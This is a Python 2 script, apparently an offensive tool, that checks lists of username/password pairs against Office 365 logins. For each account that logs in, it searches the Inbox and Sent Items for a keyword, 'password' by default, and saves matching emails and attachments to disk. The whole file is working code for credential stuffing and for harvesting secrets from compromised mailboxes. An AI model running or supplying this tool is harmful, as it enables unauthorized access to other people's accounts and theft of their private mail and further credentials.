import os
import optparse
from O365 import Connection, FluentInbox
from O365 import Message
import re, sys
import requests
from lxml.html import fromstring

TAG_RE = re.compile(r'<[^>]+>')

def remove_tags(text):
    return TAG_RE.sub('', text)
def checkPage(url):
	r = requests.get(url)
	tree = fromstring(r.content)
	tmpTitle=tree.findtext('.//title')
	return tmpTitle

username=""
password=""

blackList=[]
blackList1=[]
loadedList=[]
maxEmailCount=999

try: 	       
	with open("blacklist.txt") as f:
		blackList = f.readlines()
except IOError:
	pass
for x in blackList:
	x=x.strip()
	blackList1.append(x)
blackList=blackList1
blackList1=[]

parser = optparse.OptionParser()
parser.add_option('-u', action="store", dest="username", help="Email address")
parser.add_option('-p', action="store", dest="password", help="Email Password")
parser.add_option('-f', action="store", dest="filename", help="File containing list of users/passwords")
parser.add_option('-d', action="store", dest="directory", help="Save emails/attachments to this folder")
parser.add_option('-s', action="store", dest="searchKeyword", help="Keyword search for content in mailbox")
parser.add_option('-r', action="store_true", help="Redownload Emails/Attachments")
parser.add_option('-a','--attachments', action="store_true", help="Save attachments")
parser.add_option('-m','--max', action="store", dest="maxCount", help="Maximum number of emails to download")
#parser.add_option('-t', '--threads', action="store", dest="numOfThreads")

loadedFile=[]
validCredList=[]
options, remainder = parser.parse_args()
if options.maxCount:
	maxEmailCount=int(options.maxCount)

if options.filename:
	tmpList=[]
	with open(options.filename) as f:
    		tmpList = f.readlines()
	for x in tmpList:
		x=x.strip()
		if len(x)>0:
			username=x.split("|")[0]
			password=x.split("|")[1]
			if [username,password] not in loadedFile:
				loadedFile.append([username,password])
if options.username and options.password:
	loadedFile.append([options.username,options.password])

url='https://outlook.office365.com/'
tmpTitle=checkPage(url)
if "Sign in to your account" not in tmpTitle:
	print "[!] Check your internet. Something went wrong."
	sys.exit()
tmpBlackList=[]

for x in loadedFile:
	username=x[0]
	password=x[1]
	try:
		if username not in blackList:
			Connection.login(username, password)
			inbox = FluentInbox()
			inbox.from_folder('Inbox').search('').fetch(count=1)
			print "[+] Valid credentials: "+username
			validCredList.append([username,password])
		else:
			print "[+] Blacklisted credentials: "+username
			tmpBlackList.append(username)
	except Exception as e:
		print e
		print "[!] Invalid credentials: "+username
		tmpBlackList.append(username)

if len(tmpBlackList)>len(blackList):
	print "[*] Updating blacklist.txt"
	blacklistFile = open("blacklist.txt", "w+")
	for x in tmpBlackList:
		blacklistFile.write(x+"\n")
	[x for x in tmpBlackList if x]
	blacklistFile.close()

folderList=[]
folderList.append("Inbox")
folderList.append("Sent Items")

searchKeyword='password'
#print "\n"
for folder in folderList:
	for x in validCredList:
		print "\n[+] Accessing '"+folder+"': "+username
		username=x[0]
		password=x[1]
		Connection.login(username, password)
		inbox = FluentInbox()
		try:
			(inbox.from_folder(folder).search('').fetch(count=1))
			#for message in inbox.from_folder(folder).search('Body:password').fetch(count=50):
			#	print message.getSubject()

			tmpDirectory=options.directory
			if not tmpDirectory.endswith("/"):
				tmpDirectory=tmpDirectory+"/"
			tmpDirectory=tmpDirectory+username
			if not os.path.exists(tmpDirectory):
				os.makedirs(tmpDirectory)
			#if len(os.listdir(tmpDirectory))<1 or options.r:
			if options.attachments:
				totalCount=0
				totalAttCount=0
				if options.searchKeyword:
					searchKeyword=options.searchKeyword
				for message in inbox.from_folder(folder).search('Body:'+searchKeyword).fetch(count=maxEmailCount):
				    # Just print the message subject
				    #print(message.getSubject())
				    if options.directory:
					if options.attachments:
						message.fetchAttachments()
						if len(message.attachments)>0:
							#totalAttCount=len(message.attachments)
						    	for att in message.attachments:
								totalAttCount+=1
							    	att.save(tmpDirectory)
					tmpSubject=message.getSubject()
					#print tmpSubject
					totalCount+=1
				print "[+] Saving "+str(totalCount)+" emails to "+tmpDirectory
				if options.attachments:
					print "[+] Saving "+str(totalAttCount)+" attachments to "+tmpDirectory
				#print "\n"
				for message in inbox.from_folder('Inbox').search('Body:'+searchKeyword).fetch(count=maxEmailCount):
					tmpSubject=message.getSubject()
					tmpSubject=tmpSubject.replace(":","")
					tmpSubject=tmpSubject.replace("/","")
					tmpFilename=tmpDirectory+"/"+tmpSubject+".txt"
					tmpFilename=tmpFilename.encode('ascii','replace')

					if not os.path.exists(tmpFilename):
						thefile  = open(tmpFilename, "w") 
					    	tmpMsg=(remove_tags(message.getBody()))
					    	tmpMsgList1=[]
					    	tmpMsgList=tmpMsg.split("\n")
					    	for x in tmpMsgList:
							x=x.replace("&nbsp;","")
							#x=x.strip()
							if len(x)>0:
								tmpMsgList1.append(x)
						for item in tmpMsgList1:
							item=item.encode('ascii','replace')
						  	thefile.write("%s\n" % item)
						thefile.close()

			else:
				totalCount=0
				totalAttCount=0
				if options.searchKeyword:
					searchKeyword=options.searchKeyword
				for message in inbox.from_folder(folder).search('Body:'+searchKeyword).fetch(count=maxEmailCount):
				    if options.directory:
						tmpSubject=message.getSubject()
						#print tmpSubject
						totalCount+=1
				print "[+] Saving "+str(totalCount)+" emails to "+tmpDirectory
				#print "\n"
				for message in inbox.from_folder('Inbox').search('Body:'+searchKeyword).fetch(count=maxEmailCount):
					tmpSubject=message.getSubject()
					tmpSubject=tmpSubject.replace(":","")
					tmpSubject=tmpSubject.replace("/","")
					tmpFilename=tmpDirectory+"/"+tmpSubject+".txt"
					tmpFilename=tmpFilename.encode('ascii','replace')

					if not os.path.exists(tmpFilename):
						thefile  = open(tmpFilename, "w") 
					    	tmpMsg=(remove_tags(message.getBody()))
					    	tmpMsgList1=[]
					    	tmpMsgList=tmpMsg.split("\n")
					    	for x in tmpMsgList:
							x=x.replace("&nbsp;","")
							#x=x.strip()
							if len(x)>0:
								tmpMsgList1.append(x)
						for item in tmpMsgList1:
							item=item.encode('ascii','replace')
						  	thefile.write("%s\n" % item)
						thefile.close()
		except Exception as e:
			continue
			#print e
#for message in inbox.fetch_next(100):
#    print(message.getSubject())
